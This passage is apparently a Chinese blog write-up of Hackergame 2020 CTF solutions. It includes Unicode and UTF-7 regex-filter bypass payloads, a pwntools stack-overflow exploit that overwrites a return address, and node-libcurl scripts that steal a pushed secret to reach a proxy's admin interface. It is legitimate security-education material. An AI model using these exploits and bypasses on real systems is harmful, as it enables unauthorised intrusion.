<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_upper</span>(<span class="params">s</span>):</span></span><br><span class="line">    r = re.<span class="built_in">compile</span>(<span class="string">&#x27;[fF][lL][aA][gG]&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> r.match(s):</span><br><span class="line">        print(<span class="string">&#x27;how dare you&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> s.upper() == <span class="string">&#x27;FLAG&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;yes, I will give you the flag&#x27;</span>)</span><br><span class="line">        print(<span class="built_in">open</span>(<span class="string">&#x27;/flag1&#x27;</span>).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;%s&#x27;</span> % s.upper())</span><br></pre></td></tr></table></figure>

<p>所以当输入被转为大写时相等于 FLAG 的话，可获得 flag1。<br>但是需要绕过 regex <code>[fF][lL][aA][gG]</code> 的匹配才行，所以我查了 <a target="_blank" rel="noopener" href="https://docs.python.org/3/library/stdtypes.html?highlight=upper#str.upper">Python 官方文档</a> 关于 str.upper 的原理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The uppercasing algorithm used is described in section 3.13 of the Unicode Standard.</span><br></pre></td></tr></table></figure>

<p>遂读 <a target="_blank" rel="noopener" href="https://www.unicode.org/versions/Unicode9.0.0/ch03.pdf">section 3.13 of the Unicode Standard</a> ， 发现有特例 <code>ß</code> 的 upper() 是 <code>SS</code> ，而这样的特例被公布在  <a target="_blank" rel="noopener" href="https://unicode.org/Public/UNIDATA/SpecialCasing.txt">SpecialCasing.txt</a> 中。<br>发现 <code>FB02; FB02; 0046 006C; 0046 004C; # LATIN SMALL LIGATURE FL</code> 是可利用的， 在 UNICODE 中 U+FB02 为 <code>ﬂ</code> ( 连在一起的 f 和 l )， 所以构造 payload <code>ﬂag</code> 即可绕过 regex 匹配，取得 flag1： <code>flag&#123;badunic0debadbad_db6d64b981&#125;</code>。</p>
<h3 id="编码转换工具"><a href="#编码转换工具" class="headerlink" title="编码转换工具"></a>编码转换工具</h3><p>题目源码为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">to_utf8</span>(<span class="params">s</span>):</span></span><br><span class="line">    r = re.<span class="built_in">compile</span>(<span class="string">&#x27;[fF][lL][aA][gG]&#x27;</span>)</span><br><span class="line">    s = s.encode() <span class="comment"># make it bytes</span></span><br><span class="line">    <span class="keyword">if</span> r.match(s.decode()):</span><br><span class="line">        print(<span class="string">&#x27;how dare you&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> s.decode(<span class="string">&#x27;utf-7&#x27;</span>) == <span class="string">&#x27;flag&#x27;</span>:</span><br><span class="line">        print(<span class="string">&#x27;yes, I will give you the flag&#x27;</span>)</span><br><span class="line">        print(<span class="built_in">open</span>(<span class="string">&#x27;/flag2&#x27;</span>).read())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;%s&#x27;</span> % s.decode(<span class="string">&#x27;utf-7&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p>同字符串大写工具需要绕过 regex 的匹配，<br>UTF-7 有一套特别的编码方式， 我使用了 <a target="_blank" rel="noopener" href="https://npm.runkit.com/fiunis">fiunis NodeJS 库</a> 对 <code>f</code> 进行 UTF-7 编码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fiunis = <span class="built_in">require</span>(<span class="string">&quot;fiunis&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(fiunis.encode(<span class="string">&#x27;f&#x27;</span>)) <span class="comment">// &amp;+AGY-;</span></span><br></pre></td></tr></table></figure>

<p>所以构造 payload <code>+AGY-lag</code> 转换成 UTF-8 后就是 <code>flag</code> ， 取得 flag2 <code>flag&#123;please_visit_www.utf8everywhere.org_f2f97cf768&#125;</code></p>
<h2 id="233-同学的-Docker"><a href="#233-同学的-Docker" class="headerlink" title="233 同学的 Docker"></a>233 同学的 Docker</h2><p>想着要下载安装 Docker 好麻烦啊… 于是在 Github 上找到了 <a target="_blank" rel="noopener" href="https://github.com/blacktop/graboid/tree/0.15.3">graboid - Clientless Docker Image Downloader</a> 。<br>把它下载下来后， 执行 <code>graboid 8b8d3c8324c7/stringtool</code> ， 执行完毕后 Image 会被保存为 <code>8b8d3c8324c7_stringtool_latest.tar.gz</code> 。<br>这时候再执行 <code>graboid extract 8b8d3c8324c7_stringtool_latest.tar.gz</code> </p>
<p><img src="/img/post/image-20201119121620347.webp" alt="graboid extract"></p>
<p>最下面一个 layer 是 <code>rm /code/flag.txt</code> ， 倒数第二个 layer 保存着 flag.txt, 按下 space 键即可把 flag.txt extract 出来。<br>所以 flag 是 <code>flag&#123;Docker_Layers!=PS_Layers_hhh&#125;</code></p>
<h2 id="从零开始的-HTTP-链接"><a href="#从零开始的-HTTP-链接" class="headerlink" title="从零开始的 HTTP 链接"></a>从零开始的 HTTP 链接</h2><p>最开始我用 nmap 的 http-fetch 脚本来下载端口 0 的内容。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 0 -sV --script http-fetch --script-args destination=/tmp/ustc 202.38.93.111</span><br></pre></td></tr></table></figure>

<p>之后 index.html 内容会被保存在 <code>/tmp/ustc/202.38.93.111/0/index.html</code><br>发现 index.html 用 xterm 来连接 websocket shell…</p>
<p>然后试着用 NodeJS 的 <a target="_blank" rel="noopener" href="https://www.npmjs.com/package/ws">WebSocket 库</a> ， 发现能够连接上端口零，遂获取 flag。脚本我就不放出来了（没存起来 ;3）。</p>
<h2 id="来自一教的图片"><a href="#来自一教的图片" class="headerlink" title="来自一教的图片"></a>来自一教的图片</h2><p>用 Mathematica 对图像进行傅里叶变换。以下为 Mathematica 代码：</p>
<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">img = <span class="keyword">Import</span>[<span class="string">&quot;4f_system_middle.bmp&quot;</span>]</span><br><span class="line">img2 = <span class="keyword">ColorConvert</span>[img, <span class="string">&quot;GrayLevel&quot;</span>];</span><br><span class="line"><span class="keyword">ArrayPlot</span>[<span class="keyword">Log</span>[<span class="number">1</span> + <span class="keyword">Abs</span>[<span class="keyword">Fourier</span>[<span class="keyword">ImageData</span>[img2]]]]]</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://zhidao.baidu.com/question/92592226.html">（来源）</a></p>
<p>获得这样的图像<br><img src="/img/post/transform.webp" alt="transform"></p>
<p>flag 为 <code>flag&#123;Fxurier_xptics_is_fun&#125;</code></p>
<h2 id="超简陋的-OpenGL-小程序"><a href="#超简陋的-OpenGL-小程序" class="headerlink" title="超简陋的 OpenGL 小程序"></a>超简陋的 OpenGL 小程序</h2><p>具体其实我也忘记是怎么解的了… 依稀记得是网上找了不同的 <code>basic_lighting.fs</code> 和 <code>basic_lighting.vs</code>。然后乱调参数发现竟然能够显示出 flag wwww。</p>
<p><code>basic_lighting.fs</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#version 330 core   &#x2F;&#x2F;版本号</span><br><span class="line">out vec4 FragColor; &#x2F;&#x2F;输出像素颜色</span><br><span class="line"></span><br><span class="line">in vec3 ourColor; &#x2F;&#x2F;输入颜色 为上一步输出</span><br><span class="line">&#x2F;&#x2F;in vec3 ourPosition;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    FragColor &#x3D; vec4(ourColor, 1.0f); &#x2F;&#x2F;输出  </span><br><span class="line">	&#x2F;&#x2F;FragColor &#x3D; vec4(ourPosition, 1.0f);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>basic_lighting.vs</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#version 330 core    &#x2F;&#x2F;版本号</span><br><span class="line">layout (location &#x3D; 0) in vec3 aPos; &#x2F;&#x2F;顶点位置 位置0</span><br><span class="line">layout (location &#x3D; 1) in vec3 aColor; &#x2F;&#x2F;顶点颜色 位置1</span><br><span class="line"></span><br><span class="line">out vec3 ourColor; &#x2F;&#x2F;输出颜色</span><br><span class="line">&#x2F;&#x2F;out vec3 ourPosition;</span><br><span class="line">uniform float YOffset; &#x2F;&#x2F;声明一个偏移量</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;偏移量改变顶点位置</span><br><span class="line">    gl_Position &#x3D; vec4(aPos.x, aPos.y - YOffset, aPos.z-1, 1);</span><br><span class="line">    ourColor &#x3D; aColor; &#x2F;&#x2F;为输出颜色赋值 </span><br><span class="line">	&#x2F;&#x2F;ourPosition &#x3D; aPos;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>aPos.z-1</code> 更改了 z 轴的视角 （应该 ?<br>然后就可以显示出 flag 了。<img src="/img/post/image-20201120095714683.webp" alt="超简陋的 OpenGL 小程序"></p>
<p>flag 为 <code>flag&#123;glGraphicsHappy(233);&#125;</code></p>
<h2 id="生活在博弈树上"><a href="#生活在博弈树上" class="headerlink" title="生活在博弈树上"></a>生活在博弈树上</h2><h3 id="始终热爱大地"><a href="#始终热爱大地" class="headerlink" title="始终热爱大地"></a>始终热爱大地</h3><p>最开始的时候还以为是要破解那个 AI 算法以赢过 AI www， 后来发现这应该是一个 pwn 题， 因为使用了 gets() 函数，所以可以覆盖掉栈中的返回地址， 使我们跳转到 success 的地址赢得这场游戏，获取 flag。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;-r&#x27;</span> <span class="keyword">in</span> argv:</span><br><span class="line">    s = remote(<span class="string">&#x27;202.38.93.111&#x27;</span>, <span class="number">10141</span>)</span><br><span class="line">    s.send(<span class="string">&quot;&lt;token here :3&gt;\n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    s = process(<span class="string">&#x27;./tictactoe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret_address = <span class="number">0x402551</span></span><br><span class="line">s.recvuntil(<span class="string">&quot;): &quot;</span>)</span><br><span class="line">s.sendline(<span class="string">&quot;(0,1)&quot;</span>)</span><br><span class="line">s.sendline((<span class="string">&quot;(1,1)&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">147</span>).encode() + p32(ret_address))</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>

<p>最终获得 flag： <code>flag&#123;easy_gamE_but_can_u_get_my_shel1&#125;</code></p>
<h2 id="超基础的数理模拟器"><a href="#超基础的数理模拟器" class="headerlink" title="超基础的数理模拟器"></a>超基础的数理模拟器</h2><p>我说我手敲 Mathematica 三个小时多你信不信…</p>
<h2 id="超安全的代理服务器"><a href="#超安全的代理服务器" class="headerlink" title="超安全的代理服务器"></a>超安全的代理服务器</h2><h3 id="找到-Secret"><a href="#找到-Secret" class="headerlink" title="找到 Secret"></a>找到 Secret</h3><p>配置了环境参数 <code>SSLKEYLOGFILE</code> 以让 Wireshark 可以解密 TLS 流量。<br><img src="/img/post/image-20201120101856420.webp" alt="超安全的代理服务器 - 找到 Secret"></p>
<p>即可观察到 http2 push， 获得 flag: <code>flag&#123;d0_n0t_push_me&#125;</code></p>
<h3 id="入侵管理中心"><a href="#入侵管理中心" class="headerlink" title="入侵管理中心"></a>入侵管理中心</h3><p>为了方便我调试，我用了 <a target="_blank" rel="noopener" href="https://github.com/JCMais/node-libcurl">node-libcurl</a> 来获取 <a target="_blank" rel="noopener" href="https://github.com/JCMais/node-libcurl/blob/develop/examples/20-http2-server-push.js">http2 push</a> 的内容。<br><code>getSecret.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">  Curl,</span><br><span class="line">  CurlPush,</span><br><span class="line">  Easy,</span><br><span class="line">  Multi,</span><br><span class="line">  CurlHttpVersion,</span><br><span class="line">&#125; = <span class="built_in">require</span>(<span class="string">&quot;node-libcurl&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(Curl.getVersionInfoString());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> multi = <span class="keyword">new</span> Multi();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> outFilePath = path.join(__dirname, <span class="string">&quot;result.out&quot;</span>); <span class="comment">// 把 http2 push 的内容写入 result.out</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> handlesData = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line"></span><br><span class="line">multi.onMessage(<span class="function">(<span class="params">error, handle, errorCode</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> responseCode = handle.getInfo(<span class="string">&quot;RESPONSE_CODE&quot;</span>).data;</span><br><span class="line">  <span class="keyword">const</span> urlInfo = handle.getInfo(<span class="string">&quot;EFFECTIVE_URL&quot;</span>).data;</span><br><span class="line">  <span class="keyword">const</span> url = handle.private.url || urlInfo;</span><br><span class="line">  <span class="keyword">const</span> redirect = handle.getInfo(<span class="string">&quot;REDIRECT_URL&quot;</span>).data;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (error) &#123;</span><br><span class="line">    <span class="built_in">console</span>.error(</span><br><span class="line">      <span class="string">`Handle for <span class="subst">$&#123;url&#125;</span> (<span class="subst">$&#123;redirect&#125;</span>) returned error: &quot;<span class="subst">$&#123;error.message&#125;</span>&quot; with errcode: <span class="subst">$&#123;errorCode&#125;</span>`</span></span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(</span><br><span class="line">      <span class="string">`Handle for <span class="subst">$&#123;url&#125;</span> (<span class="subst">$&#123;redirect&#125;</span>) finished with response code <span class="subst">$&#123;responseCode&#125;</span>`</span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (handle.private &amp;&amp; handle.private.fd) &#123;</span><br><span class="line">    fs.closeSync(handle.private.fd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> data = handlesData.get(handle);</span><br><span class="line">  <span class="built_in">console</span>.log(data);</span><br><span class="line"></span><br><span class="line">  multi.removeHandle(handle);</span><br><span class="line">  handle.close();</span><br><span class="line">&#125;);</span><br><span class="line">multi.setOpt(</span><br><span class="line">  Multi.option.PUSHFUNCTION,</span><br><span class="line">  (_parent, duplicatedHandle, pushFrameHeaders) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(</span><br><span class="line">      <span class="string">&quot;-&gt; received push frame with %d headers&quot;</span>,</span><br><span class="line">      pushFrameHeaders.numberOfHeaders</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; pushFrameHeaders.numberOfHeaders; i++) &#123;</span><br><span class="line">      <span class="keyword">const</span> header = pushFrameHeaders.getByIndex(i);</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;|-&gt; header %d value is: %s&quot;</span>, i, header);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> scheme = pushFrameHeaders.getByName(<span class="string">&quot;:scheme&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> authority = pushFrameHeaders.getByName(<span class="string">&quot;:authority&quot;</span>);</span><br><span class="line">    <span class="keyword">const</span> path = pushFrameHeaders.getByName(<span class="string">&quot;:path&quot;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;|-&gt; :scheme header value is: &quot;%s&quot;&#x27;</span>, scheme);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;|-&gt; :authority header value is: &quot;%s&quot;&#x27;</span>, authority);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;|-&gt; :path header value is: &quot;%s&quot;&#x27;</span>, path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;||-&gt; push allowed as it is a known file&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&quot;||-&gt; adding callback to write file to disk&quot;</span>);</span><br><span class="line"></span><br><span class="line">      duplicatedHandle.private = &#123;</span><br><span class="line">        fd: fs.openSync(outFilePath, <span class="string">&quot;w+&quot;</span>),</span><br><span class="line">        position: <span class="number">0</span>,</span><br><span class="line">        url: <span class="string">`<span class="subst">$&#123;scheme&#125;</span>://<span class="subst">$&#123;authority&#125;</span><span class="subst">$&#123;path&#125;</span>`</span>,</span><br><span class="line">      &#125;;</span><br><span class="line">      duplicatedHandle.setOpt(<span class="string">&quot;WRITEFUNCTION&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data, size, nmemb</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> written = fs.writeSync(</span><br><span class="line">          <span class="built_in">this</span>.private.fd,</span><br><span class="line">          data,</span><br><span class="line">          <span class="number">0</span>,</span><br><span class="line">          size * nmemb,</span><br><span class="line">          <span class="built_in">this</span>.private.position</span><br><span class="line">        );</span><br><span class="line">        <span class="built_in">this</span>.private.position += written;</span><br><span class="line">        <span class="keyword">return</span> written;</span><br><span class="line">      &#125;);</span><br><span class="line">      <span class="keyword">return</span> CurlPush.Ok;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;||-&gt; unknown file - denying push&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> CurlPush.Deny;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">process.on(<span class="string">&quot;exit&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  multi.close();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> handle = <span class="keyword">new</span> Easy();</span><br><span class="line">handle.private = &#123;&#125;;</span><br><span class="line">handle.setOpt(<span class="string">&quot;URL&quot;</span>, <span class="string">&quot;https://146.56.228.227/&quot;</span>);</span><br><span class="line">handle.setOpt(<span class="string">&quot;SSL_VERIFYPEER&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">handle.setOpt(<span class="string">&quot;FOLLOWLOCATION&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">handle.setOpt(<span class="string">&quot;HTTP_VERSION&quot;</span>, CurlHttpVersion.V2Tls);</span><br><span class="line">handle.setOpt(<span class="string">&quot;VERBOSE&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">handle.setOpt(<span class="string">&quot;WRITEFUNCTION&quot;</span>, <span class="function"><span class="keyword">function</span> <span class="title">onData</span>(<span class="params">data, n, nmemb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> existingData = handlesData.get(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!existingData) &#123;</span><br><span class="line">    existingData = [];</span><br><span class="line">    handlesData.set(<span class="built_in">this</span>, existingData);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  existingData.push(data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n * nmemb;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">multi.addHandle(handle);</span><br></pre></td></tr></table></figure>

<p><code>accessAdmin.js</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; Curl, CurlHttpVersion &#125; = <span class="built_in">require</span>(<span class="string">&quot;node-libcurl&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> curl = <span class="keyword">new</span> Curl();</span><br><span class="line"><span class="keyword">const</span> fileContent = fs.readFileSync(<span class="string">&quot;./result.out&quot;</span>).toString();</span><br><span class="line"><span class="keyword">const</span> secret = fileContent.match(<span class="regexp">/([a-zA-Z0-9]&#123;10&#125;) !/</span>)[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">curl.setOpt(<span class="string">&quot;URL&quot;</span>, <span class="string">&quot;http://0.0.0.0:8080/&quot;</span>);</span><br><span class="line">curl.setOpt(<span class="string">&quot;SSL_VERIFYPEER&quot;</span>, <span class="number">0</span>);</span><br><span class="line">curl.setOpt(<span class="string">&quot;SSL_VERIFYHOST&quot;</span>, <span class="number">0</span>);</span><br><span class="line">curl.setOpt(<span class="string">&quot;PROXY_SSL_VERIFYPEER&quot;</span>, <span class="number">0</span>);</span><br><span class="line">curl.setOpt(<span class="string">&quot;PROXY_SSL_VERIFYHOST&quot;</span>, <span class="number">0</span>);</span><br><span class="line">curl.setOpt(<span class="string">&quot;HTTP_VERSION&quot;</span>, CurlHttpVersion.V2_0);</span><br><span class="line">curl.setOpt(<span class="string">&quot;PROXY&quot;</span>, <span class="string">&quot;https://146.56.228.227:443/&quot;</span>);</span><br><span class="line">curl.setOpt(<span class="string">&quot;PROXYHEADER&quot;</span>, [<span class="string">`Secret: <span class="subst">$&#123;secret&#125;</span>`</span>]);</span><br><span class="line">curl.setOpt(<span class="string">&quot;REFERER&quot;</span>, <span class="string">&quot;http://146.56.228.227/&quot;</span>);</span><br><span class="line">curl.setOpt(<span class="string">&quot;HTTPPROXYTUNNEL&quot;</span>, <span class="number">1</span>); <span class="comment">// 我因为没设置这个参数失败了几个小时...</span></span><br><span class="line">curl.setOpt(<span class="string">&quot;FOLLOWLOCATION&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">curl.setOpt(<span class="string">&quot;VERBOSE&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">curl.on(<span class="string">&quot;end&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">statusCode, data, headers</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.info(statusCode);</span><br><span class="line">  <span class="built_in">console</span>.info(headers);</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">  <span class="built_in">console</span>.info(data);</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">  <span class="built_in">console</span>.info(<span class="built_in">this</span>.getInfo(<span class="string">&quot;TOTAL_TIME&quot;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">this</span>.close();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">curl.on(<span class="string">&quot;error&quot;</span>, curl.close.bind(curl));</span><br><span class="line">curl.perform();</span><br></pre></td></tr></table></figure>

<p>关于 <code>accessAdmin.js</code> 的 <code>HTTPPROXYTUNNEL</code> 参数, 我失败了几个小时发现是因为我没启用 HTTP Proxy Tunnel 参数…<br>根据 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling">MDN 文档</a>：</p>
<p>HTTP tunneling is using a protocol of higher level (HTTP) to transport a lower level protocol (TCP).</p>
<p>The HTTP protocol specifies a request method called <code>CONNECT</code>.<br>It starts two-way communications with the requested resource and can be used to open a tunnel. This is how a client behind an HTTP proxy can access websites using SSL (i.e. HTTPS, port 443). </p>
<p>(同理，使 client behind an HTTP2 over TLS proxy can access websites without using SSL.)</p>
<p>执行 <code>node getSecret.js &amp;&amp; node accessAdmin.js</code> 即可得到 flag。</p>
<h2 id="超精准的宇宙射线模拟器"><a href="#超精准的宇宙射线模拟器" class="headerlink" title="超精准的宇宙射线模拟器"></a>超精准的宇宙射线模拟器</h2><p>最开始实在是没有思路，就在 Google 上搜一搜，结果还真的给我搜到原题了。</p>
